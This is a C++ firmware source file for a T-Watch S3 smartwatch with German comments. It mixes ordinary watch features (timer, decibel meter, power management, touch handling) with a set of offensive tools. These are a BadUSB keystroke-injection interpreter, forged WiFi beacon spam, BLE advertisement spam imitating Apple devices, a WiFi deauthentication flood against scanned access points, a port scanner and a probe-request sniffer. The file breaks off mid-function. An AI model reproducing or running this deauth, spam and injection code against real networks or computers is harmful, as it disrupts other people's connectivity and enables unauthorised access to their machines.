// --- Logic.cpp ---
#include "Logic.h"
#include "Globals.h"
#include "Display.h" 
#include "GoodApps.h"
#include "BadApps.h" 
#include "HardwareConfig.h" 
#include <esp_sleep.h>
#include <driver/i2s.h>
#include <BLEDevice.h>
#include <WiFi.h>      
#include <esp_wifi.h> 

#define TOUCH_INT 16 // HIER IST DER FIX: Pin für den Touch-Wakeup definiert!

extern "C" {
    typedef uint8_t esp_bd_addr_t[6];
    int esp_ble_gap_set_rand_addr(esp_bd_addr_t rand_addr);
}

extern void toggleWLAN();
extern void toggleUsbHid();
extern void playSynthSound(int type, int duration);

bool badUsbActive = false;
bool wifiSpamActive = false;
bool bleSpamActive = false;

void showToast(String msg, int duration) { toastMsg = msg; toastEndTime = millis() + duration; toastColor = 0x2945; lastSecond = -1; }
void showToastColor(String msg, int duration, uint16_t col) { toastMsg = msg; toastEndTime = millis() + duration; toastColor = col; lastSecond = -1; }
void triggerVibration() { if (vibActive) { drv.selectLibrary(1); drv.setMode(0); drv.setWaveform(0, hapticWaveform); drv.setWaveform(1, 0); drv.run(); } }
void triggerAlarm() { for(int i=0; i<4; i++) { if(timerAlarmMode == 0 || timerAlarmMode == 2) { drv.selectLibrary(1); drv.setMode(0); drv.setWaveform(0, 47); drv.setWaveform(1, 0); drv.run(); } if(timerAlarmMode == 1 || timerAlarmMode == 2) { playSynthSound(6, 200); } delay(400); } }

void killAllApps() { 
    swRunning = false; swElapsed = 0; timerRunning = false; timerRemaining = 0; stopMic(); jigglerActive = false;
    badUsbActive = false; wifiSpamActive = false; bleSpamActive = false;
    nmapActive = false; deauthActive = false;
    diceRolling = false;
    if (probeMonActive) stopProbeMonitor();
    if (bleScanActive) stopBleScan();
    
    if(deauthState > 0 || nmapState > 0) {
        esp_wifi_set_promiscuous(false);
        WiFi.disconnect(true);
        WiFi.mode(WIFI_OFF);
        deauthState = 0; nmapState = 0;
    }
}

void killBadApps() {
    badUsbActive = false; wifiSpamActive = false; bleSpamActive = false;
    nmapActive = false; deauthActive = false;
    if (probeMonActive) stopProbeMonitor();
    if (bleScanActive) stopBleScan();
    if (evilActive) { toggleEvilPortal(); }
    if(deauthState > 0 || nmapState > 0) {
        esp_wifi_set_promiscuous(false);
        WiFi.disconnect(true);
        WiFi.mode(WIFI_OFF);
        deauthState = 0; nmapState = 0;
    }
}

void toggleBT() { btActive = !btActive; if (btActive) { if (!bleInitDone) { BLEDevice::init("T-Watch S3"); bleInitDone = true; } delay(300); showToast("Bluetooth An", 3500); } else { if (bleInitDone) { BLEDevice::deinit(true); bleInitDone = false; } delay(300); showToast("Bluetooth Aus", 3500); } }
void toggleVibra() { vibActive = !vibActive; prefs.begin("clock", false); prefs.putBool("vib", vibActive); prefs.end(); if (vibActive) triggerVibration(); showToast(vibActive ? "Vibration An" : "Vibration Aus", 3500); }

void startMic() { if(micActive) return; i2s_start(I2S_NUM_0); micActive = true; }
void stopMic() { if(!micActive) return; i2s_stop(I2S_NUM_0); micActive = false; debug_rms = 0.0; }
int getDecibels() {
    if(!micActive) return 0; 
    
    // Stereo-Buffer lesen (L+R interleaved, wir brauchen nur L)
    size_t bytes_read = 0; 
    int16_t i2s_read_buff[1024]; 
    esp_err_t err = i2s_read(I2S_NUM_0, (void*)i2s_read_buff, sizeof(i2s_read_buff), &bytes_read, 50 / portTICK_PERIOD_MS);
    if (err != ESP_OK || bytes_read == 0) { debug_rms = -1.0; return 0; }
    
    int totalSamples = bytes_read / 2; // Gesamtzahl int16_t Werte (L,R,L,R,...)
    
    // Nur den linken Kanal extrahieren (jedes 2. Sample, Index 0, 2, 4, ...)
    int monoCount = 0;
    long sum = 0;
    for (int i = 0; i < totalSamples; i += 2) {
        sum += i2s_read_buff[i]; 
        monoCount++;
    }
    if (monoCount == 0) return 0;
    
    // 1. DC-Offset berechnen und entfernen
    int16_t dcOffset = sum / monoCount;
    
    // 2. RMS nur über den linken Kanal
    double rms = 0; 
    for (int i = 0; i < totalSamples; i += 2) { 
        double val = (double)(i2s_read_buff[i] - dcOffset); 
        rms += (val * val); 
    }
    rms = sqrt(rms / monoCount); 
    debug_rms = rms; 
    
    if (rms < 10.0) return 0; 
    
    // 3. dB SPL Berechnung kalibriert für T-Watch S3 PDM-Mic
    int db = (int)(20.0 * log10(rms / 30.0) + 30.0);
    if (db < 25) db = 25; 
    if (db > 120) db = 120; 
    
    // 4. Smoothing (70% neuer Wert, 30% alter) — schnell reaktiv, kein Flackern
    static int lastDb = 0;
    if (lastDb == 0) lastDb = db;
    db = (db * 7 + lastDb * 3) / 10;
    lastDb = db;
    
    return db;
}

String translateForLayout(String text, int layout) {
    if (layout == 0) return text; 
    String res = "";
    for(int i=0; i<text.length(); i++) {
        char c = text[i];
        switch(c) {
            case 'z': res += 'y'; break; case 'Z': res += 'Y'; break; case 'y': res += 'z'; break; case 'Y': res += 'Z'; break;
            case ':': res += '>'; break; case '/': res += '&'; break; case '?': res += '_'; break; case '=': res += ')'; break;
            case '-': res += '/'; break; case '_': res += '?'; break; case '&': res += '^'; break; case '*': res += '}'; break;
            case '(': res += '*'; break; case ')': res += '('; break; case '+': res += ']'; break;
            default: res += c; break;
        }
    }
    return res;
}

void executeBadUSB() {
    if(!badUsbActive) return;
    String scriptToRun = badUsbScripts[currentBadUsbScript];
    int idx = 0;
    while(idx < scriptToRun.length() && badUsbActive) {
        int nextLine = scriptToRun.indexOf('\n', idx);
        if(nextLine == -1) nextLine = scriptToRun.length();
        String line = scriptToRun.substring(idx, nextLine);
        line.trim();
        
        if (line.startsWith("DELAY ")) { int d = line.substring(6).toInt(); delay(d); } 
        else if (line.startsWith("STRING ")) { String payload = line.substring(7); payload = translateForLayout(payload, badUsbLayout); Keyboard.print(payload); delay(50); } 
        else if (line.startsWith("GUI ")) { Keyboard.press(KEY_LEFT_GUI); if(line.length() > 4) Keyboard.press(line[4]); delay(100); Keyboard.releaseAll(); } 
        else if (line == "ENTER") { Keyboard.write(KEY_RETURN); }
        else if (line == "TAB") { Keyboard.write(KEY_TAB); }
        else if (line == "ESCAPE" || line == "ESC") { Keyboard.write(KEY_ESC); }
        else if (line == "BACKSPACE") { Keyboard.write(KEY_BACKSPACE); }
        else if (line == "DELETE") { Keyboard.write(KEY_DELETE); }
        else if (line == "INSERT") { Keyboard.write(KEY_INSERT); }
        else if (line == "HOME") { Keyboard.write(KEY_HOME); }
        else if (line == "END") { Keyboard.write(KEY_END); }
        else if (line == "PAGEUP") { Keyboard.write(KEY_PAGE_UP); }
        else if (line == "PAGEDOWN") { Keyboard.write(KEY_PAGE_DOWN); }
        else if (line == "UPARROW" || line == "UP") { Keyboard.write(KEY_UP_ARROW); }
        else if (line == "DOWNARROW" || line == "DOWN") { Keyboard.write(KEY_DOWN_ARROW); }
        else if (line == "LEFTARROW" || line == "LEFT") { Keyboard.write(KEY_LEFT_ARROW); }
        else if (line == "RIGHTARROW" || line == "RIGHT") { Keyboard.write(KEY_RIGHT_ARROW); }
        else if (line == "SPACE") { Keyboard.write(' '); }
        else if (line == "PRINTSCREEN") { Keyboard.write(KEY_PRINT_SCREEN); }
        else if (line == "CAPSLOCK") { Keyboard.write(KEY_CAPS_LOCK); }
        else if (line.startsWith("F") && line.length() <= 3 && line.substring(1).toInt() >= 1 && line.substring(1).toInt() <= 12) {
            int fn = line.substring(1).toInt();
            Keyboard.write(KEY_F1 + fn - 1);
        }
        else if (line.startsWith("ALT ")) { Keyboard.press(KEY_LEFT_ALT); if(line.length() > 4) Keyboard.press(line[4]); delay(100); Keyboard.releaseAll(); }
        else if (line.startsWith("CTRL ") || line.startsWith("CONTROL ")) { 
            int sp = line.indexOf(' '); String rest = line.substring(sp + 1); rest.trim();
            Keyboard.press(KEY_LEFT_CTRL); 
            if (rest.length() == 1) Keyboard.press(rest[0]); 
            delay(100); Keyboard.releaseAll(); 
        }
        else if (line.startsWith("SHIFT ")) { Keyboard.press(KEY_LEFT_SHIFT); if(line.length() > 6) Keyboard.press(line[6]); delay(100); Keyboard.releaseAll(); }
        else if (line.startsWith("ALT+TAB")) { Keyboard.press(KEY_LEFT_ALT); Keyboard.press(KEY_TAB); delay(100); Keyboard.releaseAll(); }
        else if (line.startsWith("CTRL+ALT ")) { 
            Keyboard.press(KEY_LEFT_CTRL); Keyboard.press(KEY_LEFT_ALT);
            if(line.length() > 9) Keyboard.press(line[9]); 
            delay(100); Keyboard.releaseAll(); 
        }
        
        idx = nextLine + 1;
        yield();
    }
    badUsbActive = false; lastSecond = -1;
}

void spamBeacons() {
    if(!wifiSpamActive) return;
    uint8_t packet[128] = { 0x80, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x64, 0x00, 0x31, 0x04, 0x00, 0x00 };
    String ssids[10]; int count = 0; int start = 0;
    for(int i=0; i<spamSSIDs.length(); i++) {
        if(spamSSIDs[i] == ',' || i == spamSSIDs.length()-1) {
            if(i == spamSSIDs.length()-1) ssids[count] = spamSSIDs.substring(start);
            else ssids[count] = spamSSIDs.substring(start, i);
            ssids[count].trim(); count++; start = i+1; if(count >= 10) break;
        }
    }
    if(count == 0) return;

    for(int j=0; j<5; j++) { 
        for(int i=0; i<count; i++) {
            if(!wifiSpamActive) return;
            packet[10] = packet[16] = random(256); packet[11] = packet[17] = random(256); packet[12] = packet[18] = random(256);
            packet[13] = packet[19] = random(256); packet[14] = packet[20] = random(256); packet[15] = packet[21] = random(256);
            int ssidLen = ssids[i].length(); if(ssidLen > 32) ssidLen = 32; packet[37] = ssidLen; 
            for(int k=0; k<ssidLen; k++) packet[38+k] = ssids[i][k];
            packet[38+ssidLen] = 0x01; packet[39+ssidLen] = 0x08; packet[40+ssidLen] = 0x82; packet[41+ssidLen] = 0x84; packet[42+ssidLen] = 0x8b; packet[43+ssidLen] = 0x96; packet[44+ssidLen] = 0x24; packet[45+ssidLen] = 0x30; packet[46+ssidLen] = 0x48; packet[47+ssidLen] = 0x6c;
            esp_wifi_80211_tx(WIFI_IF_AP, packet, 48 + ssidLen, false);
            delay(5);
        }
    }
}

void spamBLE() {
    if (!bleSpamActive) return;
    static unsigned long lastBleSpam = 0;
    if (millis() - lastBleSpam < 100) return; 
    lastBleSpam = millis();

    if (!bleInitDone) { BLEDevice::init("T-Watch"); bleInitDone = true; }

    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

    uint8_t payload[] = {
        0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x0e, 0x02, 0x20, 0x75,
        0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
    };
    const uint8_t models[] = {0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14}; 
    payload[6] = models[random(sizeof(models))];
    
    oAdvertisementData.addData((char*)payload, sizeof(payload)); 
    pAdvertising->setAdvertisementData(oAdvertisementData);
    pAdvertising->start();
    delay(20);
    pAdvertising->stop();
}

void scanAir() {
    if(!isScanningAir) return;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    int n = WiFi.scanNetworks(false, false, false, 300);
    numScannedNetworks = 0;
    for (int i = 0; i < n && i < 15; i++) {
        scannedSSIDs[i] = WiFi.SSID(i);
        scannedMACs[i] = WiFi.BSSIDstr(i);
        numScannedNetworks++;
    }
    isScanningAir = false;
    WiFi.scanDelete();
    currentDeauthTarget = 0;
    lastSecond = -1;
}

void executeDeauth() {
    if (!deauthActive) { deauthState = 0; return; }
    
    if (deauthState == 0) {
        if(numScannedNetworks == 0) { deauthActive = false; return; }
        String bssidStr = scannedMACs[currentDeauthTarget];
        char* ptr;
        deauthMac[0] = strtol(bssidStr.substring(0, 2).c_str(), &ptr, 16);
        deauthMac[1] = strtol(bssidStr.substring(3, 5).c_str(), &ptr, 16);
        deauthMac[2] = strtol(bssidStr.substring(6, 8).c_str(), &ptr, 16);
        deauthMac[3] = strtol(bssidStr.substring(9, 11).c_str(), &ptr, 16);
        deauthMac[4] = strtol(bssidStr.substring(12, 14).c_str(), &ptr, 16);
        deauthMac[5] = strtol(bssidStr.substring(15, 17).c_str(), &ptr, 16);
        
        deauthState = 2; 
        WiFi.mode(WIFI_AP); 
        esp_wifi_set_promiscuous(true);
        lastSecond = -1;
    } else if (deauthState == 2) {
        uint8_t deauth_pkt[26] = {
            0xc0, 0x00, 0x00, 0x00, 
            0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 
            deauthMac[0], deauthMac[1], deauthMac[2], deauthMac[3], deauthMac[4], deauthMac[5], 
            deauthMac[0], deauthMac[1], deauthMac[2], deauthMac[3], deauthMac[4], deauthMac[5], 
            0x00, 0x00, 
            0x07, 0x00 
        };
        for(int i=0; i<30; i++) {
            esp_wifi_80211_tx(WIFI_IF_AP, deauth_pkt, sizeof(deauth_pkt), false);
            delay(2);
        }
    }
}

void executeNmap() {
    if (!nmapActive) { nmapState = 0; return; }
    
    if (nmapState == 0) {
        nmapLog = "Verbinde mit " + targetSSIDs[currentTargetNmap] + "...\n";
        WiFi.mode(WIFI_STA);
        WiFi.begin(targetSSIDs[currentTargetNmap].c_str(), targetPWDs[currentTargetNmap].c_str());
        nmapState = 1;
        lastSecond = -1;
    } 
    else if (nmapState == 1) {
        if (WiFi.status() == WL_CONNECTED) {
            nmapLog += "Verbunden!\nLokal: " + WiFi.localIP().toString() + "\nScanne...\n";
            nmapIP = 1;
            nmapState = 2;
            lastSecond = -1;
        } else if (WiFi.status() == WL_CONNECT_FAILED || WiFi.status() == WL_NO_SSID_AVAIL) {
            nmapLog += "Fehler: WLAN nicht gefunden\noder PW falsch!\n";
            nmapState = 4;
            nmapActive = false;
            lastSecond = -1;
        }
    } 
    else if (nmapState == 2) {
        static unsigned long lastTick = 0;
        if(millis() - lastTick < 50) return; 
        lastTick = millis();

        // Parse ports from nmapPorts string
        static int ports[10]; static int portCount = 0;
        if (portCount == 0) {
            String tmp = nmapPorts; int pi = 0;
            while (tmp.length() > 0 && pi < 10) {
                int sep = tmp.indexOf(',');
                if (sep == -1) { ports[pi++] = tmp.toInt(); break; }
                ports[pi++] = tmp.substring(0, sep).toInt(); tmp = tmp.substring(sep + 1);
            }
            portCount = pi; nmapCurrentPort = 0;
        }

        if (nmapIP > 254) {
            nmapLog += "Scan beendet.\n";
            nmapState = 3;
            nmapActive = false;
            portCount = 0;
            WiFi.disconnect(true);
            WiFi.mode(WIFI_OFF);
            lastSecond = -1;
            return;
        }

        IPAddress base;
        if (base.fromString(nmapBaseIP + "1")) {
            IPAddress target(base[0], base[1], base[2], nmapIP);
            if (target != WiFi.localIP()) {
                for (int p = 0; p < portCount; p++) {
                    WiFiClient client;
                    if (client.connect(target, ports[p], 40)) { 
                        nmapLog += "+ " + target.toString() + ":" + String(ports[p]) + " Offen\n";
                        client.stop();
                        lastSecond = -1;
                    }
                }
            }
        }
        nmapIP++;
    }
}

// ---------------------------------------------------------
// WiFi Probe Request Monitor (Promiscuous Mode)
// ---------------------------------------------------------

// ISR-safe ring buffer for probe data (no heap allocation in callback!)
#define PROBE_RING_SIZE 8
static volatile int probeRingHead = 0;
static volatile int probeRingTail = 0;
static char probeRingMac[PROBE_RING_SIZE][18];
static char probeRingSSID[PROBE_RING_SIZE][33];
static volatile int probeRingRssi[PROBE_RING_SIZE];

static void probeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* frame = pkt->payload;
    // Probe Request = subtype 0x04 (bits 4-7 of byte 0)
    if ((frame[0] & 0xF0) != 0x40) return;

    int nextHead = (probeRingHead + 1) % PROBE_RING_SIZE;
    if (nextHead == probeRingTail) return; // ring full, drop

    // Extract source MAC (offset 10)
    snprintf(probeRingMac[probeRingHead], 18, "%02X:%02X:%02X:%02X:%02X:%02X",
             frame[10], frame[11], frame[12], frame[13], frame[14], frame[15]);

    // Extract SSID from tagged parameters (offset 24+)
    probeRingSSID[probeRingHead][0] = '\0';
    if (pkt->rx_ctrl.sig_len > 26) {
        int pos = 24;
        while (pos < (int)pkt->rx_ctrl.sig_len - 2) {
            uint8_t tagNum = frame[pos];
            uint8_t tagLen = frame[pos + 1];
            if (tagNum == 0 && tagLen > 0 && tagLen < 33) {
                memcpy(probeRingSSID[probeRingHead], &frame[pos + 2], tagLen);
                probeRingSSID[probeRingHead][tagLen] = '\0';
                break;
            }
            pos += 2 + tagLen;
            if (tagLen == 0) break;
        }
    }
    if (probeRingSSID[probeRingHead][0] == '\0') {
        memcpy(probeRingSSID[probeRingHead], "(Broadcast)", 12);
    }

    probeRingRssi[probeRingHead] = pkt->rx_ctrl.rssi;
    probeRingHead = nextHead; // publish
}

// Called from main loop to drain ring buffer into String arrays safely
void processProbeRing() {
    while (probeRingTail != probeRingHead) {
        String mac = String(probeRingMac[probeRingTail]);
        String ssid = String(probeRingSSID[probeRingTail]);
        int rssi = probeRingRssi[probeRingTail];
        probeRingTail = (probeRingTail + 1) % PROBE_RING_SIZE;

        // Check for duplicate MAC
        bool found = false;
        for (int i = 0; i < probeCount; i++) {
            if (probeMacs[i] == mac) {
                probeSSIDs[i] = ssid;
                probeRSSI[i] = rssi;
                found = true;
                break;
            }
        }
        if (!found && probeCount < MAX_PROBES) {
            probeMacs[probeCount] = mac;
            probeSSIDs[probeCount] = ssid;
            probeRSSI[probeCount] = rssi;
            probeCount++;
            lastSecond = -1;
        }
    }
}

void startProbeMonitor() {
    probeCount = 0;
    probeScrollOffset = 0;
    probeMonActive = true;
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(100);
    esp_wifi_set_promiscuous_rx_cb(probeSnifferCallback);
    esp_wifi_set_promiscuous(true);
    wifi_promiscuous_filter_t filt;
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT;
    esp_wifi_set_promiscuous_filter(&filt);
    lastSecond = -1;
}

void stopProbeMonitor() {
    probeMonActive = false;
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    lastSecond = -1;
}

// ---------------------------------------------------------
// BLE Scanner
// ---------------------------------------------------------
class BleScanCallbacks : public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) override {
        String mac = String(advertisedDevice.getAddress().toString().c_str());
        mac.toUpperCase();

        // Check for duplicate
        for (int i = 0; i < bleScanCount; i++) {
            if (bleScanMacs[i] == mac) {
                bleScanRssi[i] = advertisedDevice.getRSSI();
                if (advertisedDevice.haveName()) bleScanNames[i] = String(advertisedDevice.getName().c_str());
                return;
            }
        }
        if (bleScanCount < MAX_BLE_RESULTS) {
            bleScanMacs[bleScanCount] = mac;
            bleScanRssi[bleScanCount] = advertisedDevice.getRSSI();
            bleScanNames[bleScanCount] = advertisedDevice.haveName() ? String(advertisedDevice.getName().c_str()) : "(Unknown)";
            bleScanCount++;
            lastSecond = -1;
        }
    }
};

static BleScanCallbacks bleScanCb;

void startBleScan() {
    bleScanCount = 0;
    bleScanScrollOffset = 0;
    bleScanActive = true;
    if (!bleInitDone) { BLEDevice::init("T-Watch S3"); bleInitDone = true; }
    BLEScan* pScan = BLEDevice::getScan();
    pScan->setAdvertisedDeviceCallbacks(&bleScanCb, true);
    pScan->setActiveScan(true);
    pScan->setInterval(100);
    pScan->setWindow(99);
    pScan->start(0, nullptr, false); // continuous scan
    lastSecond = -1;
}

void stopBleScan() {
    bleScanActive = false;
    if (bleInitDone) {
        BLEDevice::getScan()->stop();
        if (!btActive) { BLEDevice::deinit(true); bleInitDone = false; }
    }
    lastSecond = -1;
}

void checkBackgroundTasks(unsigned long currentMillis) {
    if (probeMonActive) processProbeRing(); // drain ISR ring buffer safely
    // Mikrofon (I2S RX) an die Dezibel-Seite koppeln. Vorher wurde es beim
    // normalen Zurückwischen nicht gestoppt -> unnötiger Strom-/CPU-Verbrauch.
    // Deklarativ: Seite 9 aktiv -> Mic an, sonst aus. Robust für alle Wege.
    if (currentPage == 9) { if (!micActive) startMic(); }
    else if (micActive) { stopMic(); }
    refreshPowerTelemetry(false);
    bool isCharging = isChargingCached(false);
    if (isCharging && !wasCharging) { wasCharging = true; showToastColor("Wird geladen ⚡", 4000, 0x07E0); } else if (!isCharging && wasCharging) { wasCharging = false; showToastColor("Akku-Modus 🔋", 4000, 0x4208); }
    if (timerRunning && (currentMillis - timerLastTick >= 1000)) { timerRemaining--; timerLastTick = currentMillis; if (timerRemaining <= 0) { timerRunning = false; timerRemaining = 0; triggerAlarm(); lastSecond = -1; lastTouchTime = currentMillis; showToastColor("Timer abgelaufen! ⏱️", 6000, 0xFD20); } }

    static unsigned long lastJiggle = 0; 
    if (jigglerActive && currentMillis - lastJiggle > 15000) { Mouse.move(2, 2); Mouse.move(-2, -2); lastJiggle = currentMillis; }

    bool hacksRunning = (jigglerActive || badUsbActive || wifiSpamActive || bleSpamActive || deauthActive || nmapActive || evilActive || wlanActive || probeMonActive || bleScanActive);

    if (badUsbActive) executeBadUSB();
    if (wifiSpamActive) spamBeacons();
    if (bleSpamActive) spamBLE(); 
    if (deauthActive) executeDeauth();
    if (nmapActive) executeNmap();
    if (isScanningAir) scanAir();

    // Neue Good App Updates
    if (diceRolling) updateDiceAnimation();

    if (matrixMode) {
        lastTouchTime = currentMillis; setBrightness(maxBright); int16_t mx[2], my[2];
        if (touch.getPoint(mx, my, 1) > 0) { matrixMode = false; tft.fillScreen(cBG); lastSecond = -1; return; }
        static unsigned long lastMatrixUpdate = 0;
        if (currentMillis - lastMatrixUpdate > 40) {
            lastMatrixUpdate = currentMillis;
            for(int i=0; i<24; i++) {
                 if (matrixY[i] == 0 && random(10) > 2) continue; 
                 tft.fillRect(i*10, matrixY[i] - 42, 10, 14, TFT_BLACK); tft.setTextColor(0x03E0, TFT_BLACK); 
                 tft.drawChar((char)random(33, 126), i*10, matrixY[i] - 14, 2); tft.drawChar((char)random(33, 126), i*10, matrixY[i] - 28, 2); tft.setTextColor(TFT_GREEN, TFT_BLACK); tft.drawChar((char)random(33, 126), i*10, matrixY[i], 2);
                 matrixY[i] += 14; if(matrixY[i] > 282) matrixY[i] = 0; 
            }
        }
        return; 
    }

    if (currentMillis - lastHistoryTime >= historyInterval || historyCount == 0) {
        lastHistoryTime = currentMillis;
        uint16_t batVal = (uint16_t)getBattery();
        if (isCharging) batVal += 200; 
        else if (hacksRunning) batVal += 100;
        
        if (historyCount < MAX_HISTORY) { batHistoryPct[historyCount] = batVal; historyCount++; } 
        else { for(int i = 1; i < MAX_HISTORY; i++) batHistoryPct[i-1] = batHistoryPct[i]; batHistoryPct[MAX_HISTORY-1] = batVal; }
        // NVS-Schreiben nur jede 5. Messung (= alle 50min statt alle 10min) um NVS-Verschleiß zu reduzieren
        static int nvsWriteCounter = 0;
        nvsWriteCounter++;
        if (nvsWriteCounter >= 5) {
            nvsWriteCounter = 0;
            prefs.begin("clock", false);
            prefs.putInt("hCount", historyCount);
            prefs.putInt("hFmt", 2);
            prefs.putBytes("hData", batHistoryPct, MAX_HISTORY * sizeof(uint16_t));
            prefs.end();
        }
        if (currentPage == 9) lastSecond = -1; 
        
        // Batterie-Warnung bei <15% (nur wenn nicht am Laden)
        static bool lowBatWarned = false;
        bool isCharging2 = isChargingCached(false);
        uint8_t rawBat = getBattery();
        if (rawBat <= 15 && rawBat > 0 && !isCharging2 && !lowBatWarned) {
            lowBatWarned = true;
            triggerVibration(); delay(200); triggerVibration();
            showToastColor("Akku niedrig! " + String(rawBat) + "%", 5000, TFT_RED);
        } else if (rawBat > 20 || isCharging2) {
            lowBatWarned = false;
        }
    }
}

// ---------------------------------------------------------
// Das NEUE, reparierte 5-Stufen Power Management
// ---------------------------------------------------------
void handlePowerManagement(unsigned long currentMillis) {
    if(matrixMode) return; 
    
    static unsigned long lastPmuHealthCheck = 0;
    if (currentMillis - lastPmuHealthCheck > 5000) {
        lastPmuHealthCheck = currentMillis;
        if (getBatteryVoltageCached(true) <= 0.01f) {
            Wire.end(); Wire.begin(10, 11);
            if (pmu.init(Wire, 10, 11, AXP2101_SLAVE_ADDRESS)) {
                pmu.enableBattVoltageMeasure();
                pmu.enableIRQ(XPOWERS_AXP2101_BAT_INSERT_IRQ | XPOWERS_AXP2101_BAT_REMOVE_IRQ | XPOWERS_AXP2101_VBUS_INSERT_IRQ | XPOWERS_AXP2101_VBUS_REMOVE_IRQ | XPOWERS_AXP2101_PKEY_SHORT_IRQ);
                pmu.clearIrqStatus();
                refreshPowerTelemetry(true);
            }
        }
    }

    unsigned long elapsed = currentMillis - lastTouchTime; 
    static int lastPowerState = 1; 
    refreshPowerTelemetry(false);
    bool isCharging = isChargingCached(false);
    bool hacksRunning = (jigglerActive || badUsbActive || wifiSpamActive || bleSpamActive || deauthActive || nmapActive || evilActive || wlanActive || probeMonActive || bleScanActive);
    
    // Basis-Einstufung nach Zeit
    if (currentPage == 10) powerState = 1; 
    else if (elapsed < time_dim_start) powerState = 1;      // State 1: Aktiv (Hell)
    else if (elapsed < time_aod_start) powerState = 2;      // State 2: Dimmen
    else if (elapsed < time_sleep_start) powerState = 3;    // State 3: AOD (Immer hier bleiben wenn am Strom!)
    else powerState = 4;                                    // State 4: Soft Sleep Vorbereitung

    // Absolute Overrides für State 4 (Schlafen)
    if (powerState == 4) {
        if (isCharging) powerState = 3;        // B: Strom -> Dauer-AOD
        else if (hacksRunning) powerState = 5; // A: Hacks -> Stealth (Bildschirm aus, CPU an)
    }

    // Krone Hardware Button Check (PEK)
    pmu.getIrqStatus(); 
    bool pekPressed = pmu.isPekeyShortPressIrq(); 
    pmu.clearIrqStatus(); 
    
    if (pekPressed) {
        triggerVibration(); 
        if (currentPage == 10) { currentPage = 5; } 
        // Krone spult die Zeit exakt auf den Beginn der AOD Phase (State 3) vor oder zurück!
        lastTouchTime = currentMillis - time_aod_start - 10; 
        lastSecond = -1;
        return; 
    }

    // Hardware Display On/Off Logik
    if ((lastPowerState == 4 || lastPowerState == 5) && (powerState < 4)) {
        tft.writecommand(0x11); // Wake up Display!
        delay(120);
    } 
    else if ((lastPowerState < 4) && (powerState == 4 || powerState == 5)) {
        tft.writecommand(0x10); // Sleep Display!
    }

    lastPowerState = powerState;
    bool isAwake = (powerState == 1 || powerState == 2 || powerState == 3); 
    static bool wasAwake = true;
    
    // CPU Taktung für Hacks und AOD
    int desiredFreq = 80; 
    if (powerState == 1 || hacksRunning) { desiredFreq = 240; } 
    else if (powerState == 2 || powerState == 3) { desiredFreq = 160; }
    if (ESP.getCpuFreqMHz() != desiredFreq) { setCpuFrequencyMhz(desiredFreq); }

    // Helligkeits-Steuerung
    if (powerState == 1) { 
        setBrightness(maxBright); 
    } 
    else if (powerState == 2) { 
        float fade = (float)(elapsed - time_dim_start) / (time_aod_start - time_dim_start); 
        setBrightness(maxBright - ((maxBright - minBright) * fade)); 
    } 
    else if (powerState == 3) { 
        setBrightness(minBright); 
    } 
    else if (powerState == 4 || powerState == 5) {
        setBrightness(0);
    }
    
    // Screen Blanking
    if (isAwake != wasAwake) { 
        wasAwake = isAwake; 
        if (!isAwake) { tft.fillScreen(TFT_BLACK); lastSecond = -1; } 
        else { tft.fillScreen(cBG); lastSecond = -1; } 
    }

    // Echter Hardware Tiefschlaf (Nur in State 4 erlaubt!)
    if (powerState == 4) {
        esp_sleep_enable_timer_wakeup(100000); 
        esp_sleep_enable_ext0_wakeup((gpio_num_t)TOUCH_INT, 0); // Display-Touch weckt CPU auf!
        esp_light_sleep_start(); 
    }
}

bool isPageEnabled(int p) { if(p==0) return enP0; if(p==1) return enP1; if(p==2) return enP2; if(p==3) return enP3; return false; }

void handleTouchInput() {
    if(matrixMode) return;
    int16_t x[2], y[2]; 
    bool isTouched = (touch.getPoint(x, y, 1) > 0); 
    bool isApp = (currentPage >= 7 && currentPage <= 25); 

    if (isTouched) {
        // Doppel-Tipp weckt aus AOD (State 3), Sleep (State 4) und Stealth (State 5)
        if (powerState == 3 || powerState == 4 || powerState == 5) { 
            if (millis() - lastTapTime < 600) { lastTouchTime = millis(); } 
            lastTapTime = millis(); 
            delay(100); 
            return; 
        } 
        else {
            int touchY = y[0] - 34; if (currentPage == 11) touchY = y[0]; 

            if (isApp) {
                // Alle App-Pages inkl. Menü 22/23: Nur Position tracken, Tap wird erst beim Loslassen ausgewertet
            }
            lastTouchTime = millis(); lastX = x[0]; lastY = y[0];
            if (!isSwiping) { startX = lastX; startY = lastY; isSwiping = true; } 
        }
    } else if (isSwiping) {
        isSwiping = false; int dx = lastX - startX; int dy = lastY - startY;
        bool isGoodApp = (currentPage == 7 || currentPage == 8 || currentPage == 9 || currentPage == 13 || currentPage == 14 || currentPage == 24 || currentPage == 25);
        bool isBadApp  = (currentPage == 12 || (currentPage >= 15 && currentPage <= 21));
        bool isQSApp   = (currentPage == 10 || currentPage == 11);
        
        // --- Swipe UP to kill (in App-Pages 7-21) ---
        if (dy < -60 && abs(dy) > abs(dx) && isApp) {
            // Trash-Icon Animation direkt auf TFT
            tft.fillRect(80, 0, 80, 40, TFT_RED);
            tft.setTextDatum(MC_DATUM); tft.setTextColor(TFT_WHITE, TFT_RED);
            tft.drawString("KILL", 120, 20, 2);
            // Kurz anzeigen
            delay(250);
            killAllApps(); triggerVibration();
            // Rücksprung
            if (isQSApp) slideToPage(5, 0, 1);
